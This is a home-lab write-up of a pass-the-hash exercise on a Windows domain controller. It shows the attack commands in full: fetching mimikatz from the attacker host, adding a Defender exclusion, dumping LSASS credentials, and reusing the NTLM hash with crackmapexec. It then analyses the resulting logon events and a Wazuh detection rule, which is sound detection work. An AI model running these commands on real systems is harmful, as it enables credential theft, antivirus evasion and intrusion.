# Scenario 3: Pass-the-Hash Lateral Movement Detection

**Lab:** Home AD/SIEM Detection Lab
**Date:** September 21, 2026
**MITRE ATT&CK Technique:** T1550.002 — Use Alternate Authentication Material: Pass the Hash

---

## 1. Environment

| Component | Details |
|---|---|
| Domain Controller | `DC01` — Windows Server 2019 (Build 17763), domain `lab.local`, IP `192.168.92.10` |
| Attacker host | Kali Linux, IP `192.168.92.128` |
| SIEM | Wazuh (manager: `wazuh-lab-vcn`), hosted on Oracle Cloud |
| Telemetry sources | Windows Security Event Log + Wazuh agent on DC01 |
| Network | Isolated VMware NAT subnet, both hosts on same segment |

DC01 runs the Wazuh agent, forwarding Windows Security event log data to the manager for analysis.

---

## 2. Objective

Demonstrate a full Pass-the-Hash (PtH) attack chain — credential dumping, hash reuse for authentication without the plaintext password, and lateral authentication to a Windows host — and confirm the activity is detected and correctly classified end-to-end in Wazuh.

---

## 3. Attack Chain

### Step 1 — Initial access / staging
Starting from an already-compromised local Administrator session on DC01 (foothold established in an earlier lab phase), `mimikatz.exe` (x64 build) was transferred from Kali to DC01 via a Python HTTP server:

```bash
# Kali
cd /usr/share/windows-resources/mimikatz/x64/
python3 -m http.server 8000
```

```powershell
# DC01
Invoke-WebRequest -Uri http://192.168.92.128:8000/mimikatz.exe -OutFile C:\Users\Public\mimikatz.exe
```

**Obstacle encountered:** Windows Defender's real-time protection silently quarantined the binary immediately on write. Confirmed via:

```powershell
Get-MpThreatDetection
```

which returned a completed detection/remediation record (`ActionSuccess: True`, `CleaningActionID: 2`) tied to the `powershell.exe` process that wrote the file. Resolved with a scoped exclusion:

```powershell
Add-MpPreference -ExclusionPath "C:\Users\Public"
```

This Defender detection-and-remediation event is itself a useful secondary artifact — a legitimate AV telemetry signal that could be correlated in Wazuh alongside the attack timeline.

### Step 2 — Credential dumping
With the exclusion in place, Mimikatz was launched and run interactively:

```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

This pulled credentials cached in LSASS memory, yielding the real **domain** Administrator NTLM hash (SID `S-1-5-21-149295428-289302824-2914294901-500`):

```
NTLM: a8da20fca184145c67905972c8c4a63f
```

*(Note: an earlier attempt using `lsadump::sam` initially raised a false concern that the dumped hash belonged to the DC's local/DSRM account rather than the domain account, since DC01's SAM only holds built-in local accounts, not domain accounts (those live in NTDS.dit). Cross-checking against `sekurlsa::logonpasswords` confirmed the hash was in fact valid for the interactively-logged-on domain Administrator account.)*

### Step 3 — Hash validation
The hash was tested from Kali against DC01 over SMB:

```bash
crackmapexec smb 192.168.92.10 -u Administrator -H 'a8da20fca184145c67905972c8c4a63f'
```

Result:

```
SMB   192.168.92.10   445   DC01   [+] lab.local\Administrator:a8da20fca184145c67905972c8c4a63f (Pwn3d!)
```

`(Pwn3d!)` confirms the hash granted local administrator access — a working, unmodified NTLM hash was used to authenticate with **no knowledge of the plaintext password**.

**Note on scope:** because the lab currently has only one Windows host, this is technically hash reuse back to the source machine rather than movement to a distinct second host. The authentication still originates from a separate machine (Kali, `192.168.92.128`, non-domain-joined) rather than the DC itself, which is sufficient to generate a genuinely anomalous network-logon signature. A future iteration of this lab could add a second Windows host to demonstrate true dump-on-A / reuse-on-B lateral movement.

---

## 4. Raw Telemetry — Windows Security Log (Ground Truth)

Queried directly on DC01:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 3 | Format-List TimeCreated, Id, Message
```

The matching event:

```
TimeCreated              : 9/21/2026 10:24:16 AM
Logon Type                : 3
New Logon Account Name    : Administrator
New Logon Account Domain  : LAB
New Logon SID              : S-1-5-21-149295428-289302824-2914294901-500
Source Network Address    : 192.168.92.128
Logon Process              : NtLmSsp
Authentication Package    : NTLM
Package Name (NTLM only)  : NTLM V2
Elevated Token              : Yes
```

**Indicators present, all consistent with PtH:**
- **Logon Type 3** (network logon — not interactive/RDP)
- **NTLM, not Kerberos** — a legitimate interactive/RDP domain-admin session authenticates via Kerberos; NTLM here indicates the Kerberos negotiation was bypassed, as expected with PtH
- **Source Network Address 192.168.92.128** — non-domain-joined Linux host, not a typical admin workstation
- **Elevated Token: Yes** — confirms admin-level access was granted

A second 4624 logged one second earlier (`DC01$`, source `::1`, Kerberos) shows a normal local machine-account logon for comparison — useful as a side-by-side baseline of "normal" vs. "anomalous" in the same log window.

---

## 5. Wazuh Detection

### 5.1 Raw event visibility
A broad search for `data.win.system.eventID: 4624` on the `dc-victim` agent returned 96 events in the prior 24 hours (95 authentication successes), confirming Windows Security log data is reaching Wazuh without a telemetry gap — unlike the still-open Kerberoasting (4769) issue.

### 5.2 Technique classification
Filtering specifically on `rule.mitre.id: T1550.002` isolated **5 alerts**, all matching a custom Wazuh rule rather than a generic logon-success rule:

| Field | Value |
|---|---|
| Rule ID | **92652** |
| Rule description | *Successful Remote Logon Detected - User:\Administrator - NTLM authentication, possible pass-the-hash attack.* |
| Rule level | 6 |
| Agent | dc-victim |
| MITRE technique | T1550.002 — Pass the Hash |
| Timestamp | Sep 21, 2026 @ 20:24:19 (local dashboard time) |

The 5 hits split between two accounts:
- `User:\Administrator` — the actual crackmapexec authentication tested above
- `User:\ANONYMOUS LOGON` — NTLM anonymous/null-session attempts, consistent with earlier unauthenticated crackmapexec fingerprinting probes run before valid credentials were supplied

This is a **custom-authored detection rule**, not a stock Wazuh rule — it specifically classifies NTLM-authenticated remote logons as probable PtH activity, rather than relying on the generic "Windows Logon Success" rule (ID 60106), which fires on all logons regardless of authentication method and would be far too noisy to use as a standalone indicator.

---

## 6. Detection Logic Summary

The rule appears to be built around the same field combination validated against the raw Windows log in Section 4:

- `logonType == 3` (network logon)
- `authenticationPackageName == NTLM`
- Target account is a privileged/domain account (not a machine account)

This combination is a reasonable, low-noise PtH heuristic: legitimate interactive or RDP admin sessions authenticate via Kerberos, so a network logon that falls back to NTLM for a privileged account is a meaningful anomaly on a Kerberos-default AD network.

---

## 7. Outcome

| Stage | Result |
|---|---|
| Hash dumped | ✅ Real domain Administrator NTLM hash recovered via `sekurlsa::logonpasswords` |
| Hash reused | ✅ Authenticated via SMB from Kali with zero plaintext password knowledge |
| Windows Security log | ✅ 4624 (Type 3, NTLM) captured correctly on DC01 |
| Wazuh ingestion | ✅ Event reached Wazuh without delay or gap |
| Wazuh classification | ✅ Custom rule 92652 correctly tagged the event as T1550.002 / Pass the Hash |

Full attack-to-alert chain confirmed working, end-to-end, with no telemetry gap — a useful contrast to the still-open Kerberoasting (Event 4769) investigation, where DC-side logging is confirmed but the events are not yet reaching Wazuh.

---

## 8. Follow-ups / Open Items

- Investigate the recurring `ANONYMOUS LOGON` hits against the same rule — confirm they're attributable to earlier unauthenticated enumeration and not a separate unaccounted-for source.
- Add a second Windows host to the lab to demonstrate genuine dump-on-A / reuse-on-B lateral movement, rather than hash reuse back to the source DC.
- Return to the open Kerberoasting (4769) telemetry gap: events are present in the DC's Security log but not currently reaching Wazuh — root cause still undetermined.
- Consider correlating the Windows Defender quarantine/remediation event (Section 3, Step 1) as a secondary detection signal alongside the PtH alert.